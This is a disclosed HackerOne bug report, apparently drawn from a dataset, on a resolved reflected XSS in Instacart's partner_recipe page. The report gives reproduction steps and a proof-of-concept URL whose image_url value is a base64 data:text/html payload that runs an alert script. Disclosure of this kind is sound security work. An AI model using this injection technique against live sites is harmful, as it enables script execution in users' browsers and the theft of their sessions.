---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '227809'
original_report_id: '227809'
title: XSS at in instacart.com/store/partner_recipe
weakness: Cross-site Scripting (XSS) - Generic
team_handle: instacart
created_at: '2017-05-12T00:41:11.892Z'
disclosed_at: '2017-05-30T17:24:23.067Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 18
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS at in instacart.com/store/partner_recipe

## Metadata

- HackerOne Report ID: 227809
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: instacart
- Disclosed At: 2017-05-30T17:24:23.067Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

### Summary

Hi team, i found that this endpoint -> https://www.instacart.com/store/partner_recipe? at param ```image_url``` is vulnerable to XSS

#### Reproduction Steps & PoC

1)Go to ```https://www.instacart.com/store/partner_recipe?recipe_url=http://&partner_name=&ingredients[]=apples&ingredients[]=butter&ingredients[]=Splenda+Brown+Sugar+Blend&ingredients[]=cinnamon&ingredients[]=nutmeg&title="Barb%27s+Fried+Apples+-Diabetic-Low+Fat&description=&image_url=data%3atext%2fhtml%3bbase64%2cPHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4 ```
2) Right Click on link "See Image" or open image in new window
3) You see the alert popup 

{F183896}
{F183895}

**Vulnerable Enpoint :** ```https://www.instacart.com/store/partner_recipe? ```
**Vulnerable Param:** ``` image_url```
**Vulnerable Payload:** ```data%3atext%2fhtml%3bbase64%2cPHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4```

**Tested on Browserss**: Latest **Firefox** & **Chrome**

Let me know if more info needed or anything else,

king regards,
@ak1t4

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
